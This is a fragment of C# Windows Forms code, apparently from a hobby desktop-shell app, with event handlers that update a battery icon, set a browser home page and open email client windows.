        private void timer16_Tick(object sender, EventArgs e)
        {
            PowerStatus psBattery = SystemInformation.PowerStatus;
            float perFull = psBattery.BatteryLifePercent;
            //Show the remaining battery power in percentages
           label17.Text = ( perFull * 100 + "%");
            //Is the battery charging?


           if (label17.Text == "100%")
            {
                pictureBox28.Image = Properties.Resources.battery100;

            }

           if (label17.Text == "80%")
            {
                pictureBox28.Image = Properties.Resources.battery80;

            }

           if (label17.Text == "60%")
            {
                pictureBox28.Image = Properties.Resources.battery60;

            }



            if (label17.Text == "20%")
            {
                pictureBox28.Image = Properties.Resources.battery20;

            }



            if (label17.Text == "5%")
            {
                pictureBox28.Image = Properties.Resources.battery00;

            }








        }

        private void pictureBox23_Click(object sender, EventArgs e)
        {
            Properties.Settings.Default.internethome = "http://www.search.projectbird.com/";

        }

        private void panel14_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel10_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel9_Paint(object sender, PaintEventArgs e)
        {

        }

        private void pictureBox29_Click(object sender, EventArgs e)
        {
            email.Visible = true;
            panel19.Visible = false;
            ToyStory2 = new Launch.Emails.EmailClient2();
            ToyStory2.Show();
        }

        private void pictureBox30_Click(object sender, EventArgs e)
        {
           
            email.Visible = true;
            panel19.Visible = false;
            ToyStory = new Apps.Emails.EmailClient();
            ToyStory.Show();
        }

}

}



